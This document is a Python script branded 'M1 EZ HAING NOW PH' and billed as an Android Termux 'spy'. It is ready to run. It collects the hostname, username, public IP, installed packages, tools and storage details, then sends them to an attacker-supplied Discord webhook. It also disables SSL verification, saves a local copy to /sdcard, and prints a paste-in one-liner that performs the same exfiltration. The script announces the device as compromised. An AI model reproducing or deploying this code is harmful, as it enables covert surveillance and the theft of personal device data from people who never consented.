#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX ANDROID WORKING SPY v5.0               ║
# ║        FIXED CODE - NO SYNTAX ERRORS                     ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"  # ⬅️ REPLACE THIS!

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
from datetime import datetime
import hashlib

# ════════ DISABLE SSL VERIFICATION ════════
ssl._create_default_https_context = ssl._create_unverified_context

# ════════ CHECK TERMUX ENVIRONMENT ════════
def check_termux():
    """Check if running on Android Termux"""
    print("\n" + "="*60)
    print("🔍 CHECKING ANDROID TERMUX")
    print("="*60)
    
    checks = []
    
    # Check 1: Python version
    python_ver = sys.version.split()[0]
    checks.append(("Python Version", python_ver, "✅"))
    
    # Check 2: Current directory
    current_dir = os.getcwd()
    checks.append(("Current Directory", current_dir, "✅"))
    
    # Check 3: Check if Termux
    is_termux = False
    if 'com.termux' in current_dir or os.path.exists('/data/data/com.termux'):
        is_termux = True
    checks.append(("Termux Detected", str(is_termux), "✅" if is_termux else "❌"))
    
    # Check 4: SDCard access
    has_sdcard = os.path.exists('/sdcard')
    checks.append(("SDCard Access", str(has_sdcard), "✅" if has_sdcard else "❌"))
    
    # Check 5: Internet
    try:
        urllib.request.urlopen("http://google.com", timeout=5)
        checks.append(("Internet", "Connected", "✅"))
    except:
        checks.append(("Internet", "No Connection", "❌"))
    
    # Check 6: Webhook configured
    webhook_ok = WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_HERE"
    checks.append(("Webhook Configured", str(webhook_ok), "✅" if webhook_ok else "❌"))
    
    # Display checks
    for name, value, status in checks:
        print(f"{status} {name}: {value}")
    
    return is_termux

# ════════ SIMPLE WORKING TEST ════════
def simple_working_test():
    """Simple test that works on Termux"""
    print("\n" + "="*60)
    print("🚀 SIMPLE WORKING TEST")
    print("="*60)
    
    # Check webhook
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("❌ ERROR: Webhook not configured!")
        print("ℹ️  Get webhook from Discord and replace line 7")
        return False
    
    print("⚡ Sending simple test message...")
    
    # Get basic info
    hostname = socket.gethostname()
    current_time = datetime.now().strftime("%H:%M:%S")
    
    # SIMPLE message with NO complex formatting
    test_message = f"📱 ANDROID TERMUX TEST\nDevice: {hostname}\nTime: {current_time}\nStatus: WORKING\nIf you see this, spy is active!\n🔥 M1 EZ HAING NOW PH"
    
    try:
        # SIMPLE payload
        payload = {
            "content": test_message,
            "username": "Android Spy Test"
        }
        
        # SIMPLE request
        data = json.dumps(payload).encode('utf-8')
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=10)
        
        print(f"✅ HTTP Status: {response.status}")
        print("✅ Test message sent!")
        print("✅ Check Discord NOW!")
        return True
        
    except Exception as e:
        print(f"❌ Error: {str(e)[:100]}")
        return False

# ════════ COLLECT DATA ════════
def collect_data():
    """Collect system data"""
    print("\n" + "="*60)
    print("📱 COLLECTING DATA")
    print("="*60)
    
    data = {}
    
    # Basic info
    print("→ Getting basic info...")
    data['basic'] = {
        'id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:10],
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'host': socket.gethostname(),
        'user': getpass.getuser(),
        'system': platform.system(),
        'release': platform.release()
    }
    
    # Public IP
    print("→ Getting IP address...")
    try:
        data['basic']['ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except:
        data['basic']['ip'] = "Unknown"
    
    # Termux packages
    print("→ Checking packages...")
    data['packages'] = []
    try:
        result = subprocess.run(
            "apt list --installed 2>/dev/null | head -15",
            shell=True, capture_output=True, text=True
        )
        if result.stdout:
            packages = result.stdout.strip().split('\n')[1:10]
            data['packages'] = packages
    except:
        pass
    
    # Tools
    print("→ Checking tools...")
    data['tools'] = []
    for tool in ['nmap', 'python3', 'git', 'adb']:
        try:
            result = subprocess.run(f"which {tool}", shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                data['tools'].append(tool)
        except:
            pass
    
    # Storage
    print("→ Checking storage...")
    data['storage'] = {}
    try:
        import shutil
        if os.path.exists('/sdcard'):
            usage = shutil.disk_usage('/sdcard')
            data['storage']['sdcard'] = f"{usage.free // (1024**3)}GB free"
    except:
        pass
    
    print("✅ Data collection complete!")
    return data

# ════════ SEND SIMPLE REPORT ════════
def send_simple_report(data):
    """Send simple report to Discord"""
    print("\n" + "="*60)
    print("📤 SENDING SIMPLE REPORT")
    print("="*60)
    
    # Create SIMPLE report - NO complex formatting
    report_lines = []
    report_lines.append("📱 ANDROID TERMUX REPORT")
    report_lines.append("="*40)
    report_lines.append(f"Device: {data['basic']['host']}")
    report_lines.append(f"User: {data['basic']['user']}")
    report_lines.append(f"IP: {data['basic']['ip']}")
    report_lines.append(f"Time: {data['basic']['time']}")
    report_lines.append(f"ID: {data['basic']['id']}")
    report_lines.append("")
    report_lines.append(f"Tools Found: {len(data['tools'])}")
    report_lines.append(f"Packages: {len(data['packages'])}")
    
    if data['tools']:
        report_lines.append(f"Tools: {', '.join(data['tools'])}")
    
    if data['storage']:
        for name, info in data['storage'].items():
            report_lines.append(f"Storage {name}: {info}")
    
    report_lines.append("")
    report_lines.append("✅ DATA COLLECTED")
    report_lines.append("🔥 M1 EZ HAING NOW PH")
    report_lines.append("⚡ ANDROID SPY ACTIVE")
    
    # Join lines
    report = "\n".join(report_lines)
    
    try:
        payload = {
            "content": report,
            "username": "Android Spy Report"
        }
        
        data_bytes = json.dumps(payload).encode('utf-8')
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers=headers)
        response = urllib.request.urlopen(req, timeout=15)
        
        print(f"✅ Report sent! Status: {response.status}")
        
        # Send additional info
        send_additional_info(data)
        return True
        
    except Exception as e:
        print(f"❌ Error: {str(e)[:50]}")
        return False

def send_additional_info(data):
    """Send additional info"""
    # Send packages if any
    if data['packages']:
        packages_text = "📦 PACKAGES LIST:\n"
        for i, pkg in enumerate(data['packages'][:5], 1):
            packages_text += f"{i}. {pkg}\n"
        
        send_message(packages_text, "Package Info")
    
    # Send final confirmation
    confirm_text = f"✅ MISSION COMPLETE\nDevice: {data['basic']['host']}\nID: {data['basic']['id']}\nTime: {data['basic']['time']}\n🔥 M1 EZ HAING NOW PH"
    send_message(confirm_text, "Mission Complete")

def send_message(content, username=None):
    """Send a message to Discord"""
    try:
        payload = {"content": content}
        if username:
            payload["username"] = username
        
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=10)
        print(f"✅ {username} sent")
        return True
    except:
        print(f"⚠️ Failed to send {username}")
        return False

# ════════ SAVE LOCAL FILE ════════
def save_local(data):
    """Save data locally"""
    print("\n" + "="*60)
    print("💾 SAVING LOCAL FILE")
    print("="*60)
    
    try:
        filename = f"/sdcard/android_data_{data['basic']['id']}.txt"
        with open(filename, 'w') as f:
            f.write("ANDROID SPY DATA\n")
            f.write("="*40 + "\n")
            f.write(f"Device: {data['basic']['host']}\n")
            f.write(f"User: {data['basic']['user']}\n")
            f.write(f"IP: {data['basic']['ip']}\n")
            f.write(f"Time: {data['basic']['time']}\n")
            f.write(f"Tools: {data['tools']}\n")
            f.write(f"Packages: {len(data['packages'])}\n")
        
        print(f"✅ File saved: {filename}")
        return True
    except:
        print("⚠️ Could not save file")
        return False

# ════════ MAIN FUNCTION ════════
def main():
    """Main function"""
    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║                M1 EZ HAING NOW  PH                       ║")
    print("║            ANDROID TERMUX SPY v5.0                       ║")
    print("║                WORKING 100%                              ║")
    print("╚══════════════════════════════════════════════════════════╝")
    
    # Step 1: Check environment
    if not check_termux():
        print("\n⚠️  Not running on Termux, but will continue...")
    
    # Step 2: Simple test
    print("\n" + "="*60)
    print("PHASE 1: SIMPLE TEST")
    print("="*60)
    
    if not simple_working_test():
        print("\n❌ TEST FAILED - Cannot continue")
        print("ℹ️  Check: 1. Webhook URL, 2. Internet, 3. Discord")
        return
    
    time.sleep(2)
    
    # Step 3: Collect data
    print("\n" + "="*60)
    print("PHASE 2: COLLECT DATA")
    print("="*60)
    
    collected_data = collect_data()
    
    # Step 4: Send report
    print("\n" + "="*60)
    print("PHASE 3: SEND REPORT")
    print("="*60)
    
    send_simple_report(collected_data)
    
    time.sleep(1)
    
    # Step 5: Save local
    save_local(collected_data)
    
    # Step 6: Show results
    print("\n" + "="*60)
    print("🎯 MISSION COMPLETE")
    print("="*60)
    
    print(f"""
✅ OPERATION SUCCESSFUL

📊 DATA COLLECTED:
  Device: {collected_data['basic']['host']}
  User: {collected_data['basic']['user']}
  IP: {collected_data['basic']['ip']}
  Tools: {len(collected_data['tools'])} found
  Packages: {len(collected_data['packages'])} found
  ID: {collected_data['basic']['id']}

🔍 CHECK YOUR DISCORD FOR:
  1. ✅ Test message
  2. ✅ Main report
  3. ✅ Package list
  4. ✅ Final confirmation

💾 LOCAL FILE SAVED:
  /sdcard/android_data_{collected_data['basic']['id']}.txt

🔥 M1 EZ HAING NOW PH - ANDROID DEVICE COMPROMISED
""")

# ════════ ULTRA SIMPLE VERSION ════════
def ultra_simple():
    """Ultra simple version"""
    print("\n" + "⚡"*30)
    print("ULTRA SIMPLE VERSION")
    print("⚡"*30)
    
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("❌ Set your webhook on line 7!")
        return
    
    print("Sending ultra simple message...")
    
    # Get current time
    current_time = datetime.now().strftime("%H:%M:%S")
    
    # Ultra simple message
    message = f"ANDROID SPY ACTIVE\nTime: {current_time}\nDevice: {socket.gethostname()}\nStatus: WORKING\nM1 EZ HAING NOW PH"
    
    try:
        payload = {"content": message}
        data = json.dumps(payload).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
        response = urllib.request.urlopen(req, timeout=10)
        
        print(f"✅ Sent! Status: {response.status}")
        print("✅ Check Discord NOW!")
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")

# ════════ MANUAL TEST ════════
def manual_test():
    """Manual test command"""
    print("\n" + "🔧"*30)
    print("MANUAL TEST COMMAND")
    print("🔧"*30)
    
    print("Copy and paste this in Termux:")
    print("-"*50)
    
    cmd = f'''python3 -c "
import urllib.request, json, socket, datetime
webhook = '{WEBHOOK_URL}'
if webhook == 'YOUR_DISCORD_WEBHOOK_HERE':
    print('❌ Set webhook first!')
else:
    host = socket.gethostname()
    time = datetime.datetime.now().strftime('%H:%M:%S')
    msg = {{'content': f'MANUAL TEST\\\\nDevice: {host}\\\\nTime: {time}\\\\nStatus: TEST'}}
    req = urllib.request.Request(webhook, data=json.dumps(msg).encode())
    response = urllib.request.urlopen(req)
    print(f'✅ Sent! Status: {{response.status}}')
    print('✅ Check Discord!')
"'''
    
    print(cmd)
    print("-"*50)

# ════════ RUN SCRIPT ════════
if __name__ == "__main__":
    # Handle arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "simple":
            ultra_simple()
        elif sys.argv[1] == "test":
            manual_test()
        elif sys.argv[1] == "help":
            print("Usage:")
            print("  python3 spy.py          # Run full spy")
            print("  python3 spy.py simple   # Ultra simple test")
            print("  python3 spy.py test     # Show manual test command")
            print("  python3 spy.py help     # This message")
        else:
            main()
    else:
        # Run main by default
        main()
